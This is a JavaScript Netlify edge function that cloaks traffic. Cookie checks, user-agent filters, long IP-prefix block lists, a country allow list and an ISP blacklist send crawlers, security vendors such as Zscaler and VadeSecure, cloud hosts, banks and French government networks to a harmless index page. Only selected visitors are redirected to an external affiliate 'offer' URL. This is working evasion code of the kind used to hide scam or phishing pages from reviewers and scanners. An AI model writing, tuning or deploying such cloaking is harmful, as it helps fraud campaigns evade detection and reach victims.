export default async (request, context) => {
  try {
    // =====================
    // CONFIG
    // =====================
    const user_url = "https://www.aucsite.com/27X9TTQ2/7M8X59F1/?creative_id=14101";
    const allowed_countries = ['US', 'MA'];
    const DUPLICATE_BLOCK_TIME = 10800; // 3 hours

    // Safe Page Redirect Helper
    const safePageResponse = () => {
      return Response.redirect(new URL("/index.html", request.url).toString(), 302);
    };

    // =====================
    // 0. DUPLICATE CLICK CHECK (COOKIE)
    // =====================
    const cookieHeader = request.headers.get("cookie") || "";
    if (cookieHeader.includes("already_clicked=1")) {
      return safePageResponse();
    }

    // =====================
    // BLACKLISTS
    // =====================
    const black_list = [
      "Microsoft", "Microsoft Corp", "Microsoft Limited", "Amazon", "Amazon Technologies", 
      "Digital Ocean", "Cisco Opendns", "Hostpapa", "Interconnecx", "Quality Technology", 
      "U.s.next", "Longwood Medical", "Fastly", "Code 200", "Netease", "Snmp Research", 
      "Ifworld", "Royell Communications", "Penteledata", "Level 3 Parent", "Oakland Schools", 
      "Smithville Digital", "Cleardocks", "Indonesia Online", "Apple", "Zoho", "Leaseweb", 
      "OVH", "CompleTel", "Ozone", "Herault", "Supernet", "Interveille", "hosting", 
      "VIALIS", "LINKSIP", "SAEM", "GTT", "TELOISE", "Nexeon", "Commerciale", "CRIHAN", 
      "ICAUNAISE", "COOPERATIVE", "NORDNET-EXT", "INFOMIL-CLTPARIS", "NORDNET", 
      "Technologies", "cloud", "Knet", "Systeme", "Telia", "EI-TELECOM", "Interministerielle", 
      "Security", "Metropole", "GALIANA", "CNAMTS", "Alcatraz", "Adista", "KEYYO", 
      "Teranet", "OpenIP-Network", "CEGETEL", "DISIC-RIE", "M247", "ALTSYSNET-OCCITANET5G", 
      "Google", "UNIMEDIA-SERVICES", "Cogent", "Netprotect", "velia.net", "NATIXIS", 
      "Electricite", "Hub", "Labs", "Lyre", "Serveurcom", "Rezopole", "Appliwave", 
      "Epargne", "Anexia", "Caisse", "Sewan", "Reunicable", "Axione", "Scalair", "Colt", 
      "epargne", "caisse", "Poste", "Nerim", "Choopa", "SPIE", "Paritel", "DATACENTER", 
      "Layer", "ZSCALER", "Coaxis", "Firewall", "RENATER", "Online", "Traitement", 
      "Dedicated", "Owentis", "Coriolis", "Zscaler", "OZN", "CNCA", "Jaguar", "Vultr", 
      "Holdings", "LLC", "NSC-SOLUTIONS", "Backbone", "VadeSecure", "Datacamp", "Momax", 
      "Mutuel", "FIMATEX", "NEO", "Credit", "Agricole", "PSINet", "Skylogic", "Herault-networks", 
      "Alliance", "Connectic", "MYSTREAM", "GROUPAMA", "IRIS64", "Francaise", "Opentransit", 
      "Radiotelephone", "BPCE", "Rezocean", "K-net", "SCALEWAY", "Brutele", "YouSee", 
      "DigitalOcean", "Linode", "Hetzner", "CenturyLink", "Host Depot", "Zayo", "Akamai"
    ];

    const block_list = [
      "74.179.", "72.153.", "62.10.", "51.54.", "128.85.", "134.209.", "157.230.", 
      "104.244.", "146.112.", "16.146.", "16.148.", "18.224.", "192.227.", "3.87.", 
      "34.122.", "35.81.", "52.13.", "52.34.", "54.203.", "9.169.",
      "204.193.", "144.208.", "134.174.", "216.98.", "103.4.", "103.129.", 
      "135.232.", "136.143.", "142.91.", "208.80.", "12.182.", "74.202.", 
      "204.186.", "2a04:4e41:", "17.", "35.91.", "54.149.", "72.152.", 
      "82.22.", "192.147.", "128.119.", "128.8.", "216.11.", "134.199.", 
      "172.68.", "172.69.", "172.70.", "172.71.", "162.158.", "108.162.", 
      "172.64.", "141.101.", "104.16.", "104.17.", "104.18.", "104.19.",
      "193.56.2", "92.147.12.196", "194.78", "37.201.192.242", "79.166.147.44", 
      "85.73.24.124", "5.203.224.203", "176.167.97.91", "176.176.30", "194.206", 
      "185.", "176.149.93", "82.120.84", "94.143.176", "185.228.2", "176.148.157", 
      "193.57", "89.210.43.74", "62.74.15.205", "2.10.4", "92.184", "109.221", 
      "81.169.144", "141.38.12", "94.100.133.41", "141.38.1", "212.11.224", 
      "212.11.225", "79.141.36.131"
    ];

    // =====================
    // GET IP & USER AGENT
    // =====================
    const ip = context.ip || request.headers.get("x-forwarded-for")?.split(',')[0].trim() || "127.0.0.1";
    const userAgent = request.headers.get("user-agent") || "";

    // =====================
    // USER AGENT / BOT FILTER
    // =====================
    if (!userAgent || userAgent.length < 10) {
      return safePageResponse();
    }

    const bad_agents = ['bot', 'crawl', 'spider', 'slurp', 'facebook', 'python', 'curl', 'wget', 'headless', 'phantom', 'selenium', 'puppeteer'];
    if (bad_agents.some(agent => userAgent.toLowerCase().includes(agent))) {
      return safePageResponse();
    }

    // =====================
    // IP BLOCK LIST CHECK
    // =====================
    for (let prefix of block_list) {
      if (ip.startsWith(prefix)) {
        return safePageResponse();
      }
    }

    // Netlify Native Geo Check (Fast & Reliable)
    const netlifyCountry = context.geo?.country?.code;
    if (netlifyCountry && !allowed_countries.includes(netlifyCountry)) {
      return safePageResponse();
    }

    // =====================
    // GET GEO & PROXY DATA (API HTTPS)
    // =====================
    try {
      // Switched to HTTPS endpoint to prevent Edge Function crashes
      const apiRes = await fetch(`https://ipapi.co/${ip}/json/`);
      if (apiRes.ok) {
        const data = await apiRes.json();
        const country = data.country_code || 'XX';
        const isp = data.org || data.asn || 'Unknown';

        if (!allowed_countries.includes(country)) {
          return safePageResponse();
        }

        for (let item of black_list) {
          if (isp.toLowerCase().includes(item.toLowerCase())) {
            return safePageResponse();
          }
        }
      }
    } catch (err) {
      // Silently fall back if external API fails
    }

    // =====================
    // ALLOWED (SET COOKIE & REDIRECT TO OFFER)
    // =====================
    const headers = new Headers();
    headers.set("Location", user_url);
    headers.set("Set-Cookie", `already_clicked=1; Path=/; Max-Age=${DUPLICATE_BLOCK_TIME}; Secure; SameSite=Lax`);

    return new Response(null, {
      status: 302,
      headers: headers
    });

  } catch (error) {
    // Fail-safe redirect to index.html in case of any internal crash
    return Response.redirect(new URL("/index.html", request.url).toString(), 302);
  }
};

export const config = { path: "/*" };
